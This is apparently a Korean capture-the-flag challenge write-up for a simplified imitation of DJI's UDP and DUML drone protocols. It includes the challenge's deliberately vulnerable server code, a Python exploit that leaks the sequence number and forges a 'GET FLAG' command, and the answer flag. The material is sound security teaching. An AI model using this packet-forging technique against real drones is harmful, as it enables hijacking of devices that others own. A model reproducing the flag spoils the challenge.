### 문제이름
Packet-2

### 출제자
임우협

### 난이도
하

### 유형
네트워크

### 출제의도  
- DJI UDP, DUML 프로토콜에 대한 이해 및 패킷 전송 코드 작성 능력 개발
- DJI Drone 상에서 Replay 공격이 발생하기 어려움을 이해
- 네트워크 프로토콜의 취약한 구현으로 인한 보안파급성 시사

### 지문

> We acquired some of the logic of the target drone system. Analyze its contents to cause a malfunction.

### 문제 설명

DJI UDP와 DJI DUML 프로토콜을 일부 모방하여 만든 파이썬 코드이다. DJI UDP 상에서는 sequence number, packet length, packet type 필드를 사용하였고, DUML 에서는 DUML Header, Trailer, CmdSet, CmdId, 그리고 Payload를 사용하였다. 

DJI 드론 상에서는 Handshake를 맺을 시, IP/PORT 기반 통신 세션을 구분하지만 본 프로그램은 해당 내용을 포함하지 않는 방식의 취약점을 구성하였다. 또한, sequence number에 대한 힌트도 통신 과정에서 전달하도록 하여, 풀이자의 올바른 DJI UDP 및 DUML 패킷을 구현하는 능력을 테스트하고자 한다.


### 문제세팅방법
```
./docker_run.sh
```

### 풀이

```py
def handshake_by_rc():
    global g_seq
    while True:
        g_seq = random.randint(1, 65535)
        time.sleep(10)

if __name__ == "__main__":
    g_seq = None
    thread = threading.Thread(target=handshake_by_rc)
    thread.daemon = True
    thread.start()
```

전역 변수 `g_seq`는 10초를 주기로 하여 임의 난수로 세팅된다.

```py
def parse_cmd(data):
    udt_packet = DJIUDPPacket(data)
    assert udt_packet.packet_type == 0x05

    if udt_packet.sequence_number != g_seq + 1:
        return struct.pack('<HH', g_seq, udt_packet.packet_length)

    packet = CommandDataPacket(data)
    assert all([packet.payload.cmd_set == 1, packet.payload.cmd_id == 1, packet.payload.cmd_payload == b'GET FLAG'])
    return FLAG
```

해당 값을 알아내고, CmdSet과 CmdId가 1이면서, DUML Payload에 `"GET FLAG"` 문자열을 전달할 경우, 플래그를 얻는다.


```py
class DJIUDPPacket:
    def __init__(self, data):
        self.data = data
        self.parse_packet()

    def parse_packet(self):
        self.packet_length, self.sequence_number, self.packet_type = struct.unpack('<HHB', self.data[:5])
        self.packet_length = self.packet_length ^ (1 << 15)
        self.payload = self.data[5:self.packet_length]
        assert self.packet_length == len(self.data), "Invalid length"
```

sequence number의 경우, DJI UDP의 페이로드 길이가 정확하고, packet_type이 5이면 서버에서 전달해준다. 이때, 5는 일반적으로 DJI UDP 상에서 Client가 DJI Drone으로 DUML 명령을 전송할 때 사용되는 packet type 값이다. 

```py
class DJIUDPPacket:
    def __init__(self, payload, seq):
        self.seq = seq
        self.payload = payload
        
    def get_packed_data(self):
        payload_length = len(self.payload)
        packet_length = (payload_length + 5) | (1 << 15)
        packed_header = struct.pack('<HHB', packet_length, self.seq, 0x5)
        return packed_header + self.payload

def send_and_receive_udp_packet(data):
    buffer_size = 1024
    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        udp_socket.sendto(data, (host, port))
        udp_socket.settimeout(5)
        response_data, server_address = udp_socket.recvfrom(buffer_size)
        return response_data
    except socket.timeout:
        return None
    finally:
        udp_socket.close()

def exploit():
    get_seq = DJIUDPPacket(b'A'*0x10, 0x4141)
    data = send_and_receive_udp_packet(get_seq.get_packed_data())
    seq = struct.unpack('<H', data[:2])[0]
    print(f"[*] correct seq : {hex(seq)}")
```

따라서, 위와 같이 페이로드 구성 시 올바른 DJI UDP 패킷을 생성할 수 있고, 서버에서 현재 세션을 맺는데 사용한 sequence number를 획득할 수 있다.

```py
class DUMLPacket:
    def __init__(self, payload):        
        self.payload = payload

    def get_packed_data(self):
        payload = self.payload
        payload_length = len(self.payload)
        packet_length = payload_length + 11 + 2
        packed_header = struct.pack('<BH', 0x55, packet_length)
        header_checksum = struct.pack('<B', calc_hdr_checksum(0x77, packed_header, 3))
        packed_header += header_checksum
        
        dummy = b'\x00' * 5 + b'\x01\x01'
        whole_packet = packed_header + dummy + payload
        
        payload_checksum = struct.pack('<H', calc_checksum(whole_packet, len(whole_packet)))
        return whole_packet + payload_checksum

def exploit():
    ...

    duml_packet = DUMLPacket(b'GET FLAG').get_packed_data()
    get_flag = DJIUDPPacket(duml_packet, seq + 1)
    data = send_and_receive_udp_packet(get_flag.get_packed_data())
    print(f'[*] flag : {data.decode()}')
```

sequence number를 얻은 이후, DUML 패킷은 문제 조건에 맞도록 필요한 필드만 세팅하는 방식으로 구성하였다. checksum 계산의 경우, 문제 배포 파일에 `crc.py`를 그대로 사용하여 쉽게 구성할 수 있다.

최종적으로 올바른 sequence number와 플래그를 얻기 위해 구성된 DUML 페이로드를 함께 전달한다면, 플래그를 얻게 된다.

### 플래그
`HTD{NOw_1t_I5_tiME_TO_Study_Th3_dJ1_protoCO1s}`

### 참고자료
- https://github.com/samuelsadok/dji_protocol/blob/master/udp_protocol.md
